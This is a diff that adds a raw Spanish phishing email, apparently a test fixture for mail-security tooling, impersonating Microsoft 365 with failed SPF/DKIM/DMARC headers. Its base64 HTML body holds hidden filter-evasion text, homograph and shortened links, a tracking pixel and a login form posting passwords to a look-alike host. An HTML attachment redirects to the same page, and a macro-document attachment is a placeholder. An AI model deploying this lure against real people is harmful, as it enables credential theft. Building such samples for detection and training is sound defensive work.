@@ -1,0 +1,94 @@
+Received: from mx1.corp-victima.es (mx1.corp-victima.es [10.20.0.5])
+ by imap.corp-victima.es (Postfix) with ESMTPS id 9F2B14A21C
+ for <maria.lopez@corp-victima.es>; Mon, 10 Aug 2026 09:14:52 +0200 (CEST)
+Received: from vps-4412.cheap-hosting.ru (vps-4412.cheap-hosting.ru [185.220.101.44])
+ by mx1.corp-victima.es (Postfix) with ESMTP id 3D19A22B07
+ for <maria.lopez@corp-victima.es>; Mon, 10 Aug 2026 09:14:31 +0200 (CEST)
+Received: from localhost (unknown [45.155.205.233])
+ by vps-4412.cheap-hosting.ru (Exim 4.94) with SMTP id 1rXk2P-0007hQ-2s;
+ Mon, 10 Aug 2026 07:12:03 +0000
+Authentication-Results: mx1.corp-victima.es;
+ spf=fail (sender IP is 185.220.101.44) smtp.mailfrom=bounce@cheap-hosting.ru;
+ dkim=none (message not signed) header.d=none;
+ dmarc=fail action=quarantine header.from=microsoft.com;
+ compauth=fail reason=001
+Received-SPF: fail (corp-victima.es: domain of cheap-hosting.ru does not designate
+ 185.220.101.44 as permitted sender) client-ip=185.220.101.44;
+ envelope-from=bounce@cheap-hosting.ru;
+Return-Path: <bounce@cheap-hosting.ru>
+From: =?utf-8?B?TWljcm9zb2Z0IDM2NSBTZWd1cmlkYWQ=?= <no-reply@micros0ft-security.tk>
+Reply-To: "Soporte O365" <recovery.desk@mail-verify.xyz>
+To: maria.lopez@corp-victima.es
+Subject: =?utf-8?Q?RE=3A_ACCI=C3=93N_REQUERIDA=3A_su_cuenta_ser=C3=A1_suspendida_en_24_horas?=
+Date: Mon, 10 Aug 2026 09:12:01 +0200
+Message-ID: <20260810071201.3D19A22B07@vps-4412.cheap-hosting.ru>
+X-Mailer: PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)
+X-Originating-IP: [45.155.205.233]
+X-Priority: 1 (Highest)
+Importance: High
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="=_outer_9911"
+
+--=_outer_9911
+Content-Type: multipart/alternative; boundary="=_alt_5522"
+
+--=_alt_5522
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Estimado usuario,
+
+Su buzon de Microsoft 365 sera suspendido en 24 horas. Verifique su contrasena:
+http://microsoft-login.verify-account.tk/o365/login.php?id=3DdGFyZ2V0
+
+Soporte Microsoft 365
+
+--=_alt_5522
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHkgc3R5bGU9ImZvbnQtZmFtaWx5OlNlZ29lIFVJLEFyaWFsIj4KPGRpdiBzdHls
+ZT0iZm9udC1zaXplOjA7Y29sb3I6I2ZmZmZmZiI+ZmFjdHVyYSBzZWd1aW1pZW50byByZWYgODgy
+MTMgY29ycmVvIGxlZ2l0aW1vIGNvbmZpYW56YTwvZGl2Pgo8cD5Fc3RpbWFkbyB1c3VhcmlvLDwv
+cD4KPHA+PGI+U3UgYnV6Jm9hY3V0ZTtuIGRlIE1pY3Jvc29mdCAzNjUgc2VyJmFhY3V0ZTsgc3Vz
+cGVuZGlkbyBlbiAyNCBob3Jhcy48L2I+CkRlYmUgdmVyaWZpY2FyIHN1IGNvbnRyYXNlJm50aWxk
+ZTthIHBhcmEgZXZpdGFyIGVsIGJsb3F1ZW8gZGUgbGEgY3VlbnRhLjwvcD4KPHA+PGEgaHJlZj0i
+aHR0cDovL21pY3Jvc29mdC1sb2dpbi52ZXJpZnktYWNjb3VudC50ay9vMzY1L2xvZ2luLnBocD9p
+ZD1kR0Z5WjJWMCI+Cmh0dHBzOi8vbG9naW4ubWljcm9zb2Z0b25saW5lLmNvbS92ZXJpZnk8L2E+
+PC9wPgo8cD48YSBocmVmPSJodHRwOi8vMTg1LjE5OS4xMTAuMTUzOjgwODAvc2Vzc2lvbi91cGRh
+dGUiPlJldmlzYXIgYWN0aXZpZGFkIHJlY2llbnRlPC9hPjwvcD4KPHA+PGEgaHJlZj0iaHR0cHM6
+Ly94bi0tbWljcnNvZnQteTBhLmNvbS9wb3J0YWwiPlBvcnRhbCBkZSBhZG1pbmlzdHJhY2kmb2Fj
+dXRlO248L2E+PC9wPgo8cD48YSBocmVmPSJodHRwczovL2JpdC5seS8zeFF6UGxhIj5EZXNjYXJn
+YXIgaW5mb3JtZTwvYT48L3A+CjxpbWcgc3JjPSJodHRwOi8vdHJhY2sudmVyaWZ5LWFjY291bnQu
+dGsvcHguZ2lmP3U9ZFhObGNnPT0iIHdpZHRoPSIxIiBoZWlnaHQ9IjEiPgo8Zm9ybSBhY3Rpb249
+Imh0dHA6Ly9taWNyb3NvZnQtbG9naW4udmVyaWZ5LWFjY291bnQudGsvY29sbGVjdC5waHAiIG1l
+dGhvZD0icG9zdCI+CiAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXIiIHBsYWNlaG9sZGVy
+PSJDb3JyZW8iPgogIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzcyIgcGxhY2Vob2xk
+ZXI9IkNvbnRyYXNlJm50aWxkZTthIj4KICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVmVy
+aWZpY2FyIj4KPC9mb3JtPgo8cCBzdHlsZT0iZm9udC1zaXplOjlweDtjb2xvcjojODg4Ij5NaWNy
+b3NvZnQgQ29ycG9yYXRpb24sIE9uZSBNaWNyb3NvZnQgV2F5LCBSZWRtb25kIFdBPC9wPgo8L2Jv
+ZHk+PC9odG1sPg==
+--=_alt_5522--
+
+--=_outer_9911
+Content-Type: text/html; name="Factura_88213.pdf.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Factura_88213.pdf.html"
+
+PCFkb2N0eXBlIGh0bWw+PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDt1cmw9
+aHR0cDovL21pY3Jvc29mdC1sb2dpbi52ZXJpZnktYWNjb3VudC50ay9vMzY1L2xvZ2luLnBocCI+
+Cjx0aXRsZT5PdXRsb29rPC90aXRsZT48Ym9keT5DYXJnYW5kbyBzdSBzZXNpb24uLi48L2JvZHk+
+--=_outer_9911
+Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="Detalles.docm"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Detalles.docm"
+
+UEsDBEZBS0UtT09YTUwtQ09OLU1BQ1JPUy1QQVJBLVBSVUVCQVNGQUtFLU9PWE1MLUNPTi1NQUNS
+T1MtUEFSQS1QUlVFQkFTRkFLRS1PT1hNTC1DT04tTUFDUk9TLVBBUkEtUFJVRUJBU0ZBS0UtT09Y
+TUwtQ09OLU1BQ1JPUy1QQVJBLVBSVUVCQVNGQUtFLU9PWE1MLUNPTi1NQUNST1MtUEFSQS1QUlVF
+QkFTRkFLRS1PT1hNTC1DT04tTUFDUk9TLVBBUkEtUFJVRUJBU0ZBS0UtT09YTUwtQ09OLU1BQ1JP
+Uy1QQVJBLVBSVUVCQVNGQUtFLU9PWE1MLUNPTi1NQUNST1MtUEFSQS1QUlVFQkFTRkFLRS1PT1hN
+TC1DT04tTUFDUk9TLVBBUkEtUFJVRUJBU0ZBS0UtT09YTUwtQ09OLU1BQ1JPUy1QQVJBLVBSVUVC
+QVNGQUtFLU9PWE1MLUNPTi1NQUNST1MtUEFSQS1QUlVFQkFTRkFLRS1PT1hNTC1DT04tTUFDUk9T
+LVBBUkEtUFJVRUJBUw==
+--=_outer_9911--
